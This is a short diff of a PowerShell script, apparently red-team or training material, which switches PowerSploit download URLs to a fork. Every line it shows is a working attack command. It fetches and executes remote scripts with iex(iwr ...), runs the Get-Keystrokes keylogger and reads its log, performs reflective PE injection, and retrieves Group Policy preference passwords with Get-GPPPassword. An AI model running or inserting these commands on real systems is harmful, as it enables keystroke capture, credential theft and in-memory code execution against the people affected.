@@ -7,8 +7,8 @@ iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltrati
 Get-Keystrokes
 cat $env:temp\key.log
 
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
-$PEBytes = Get-Content notepad.exe -Encoding Byte -Raw
+iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1 -usebasicparsing)
+$PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
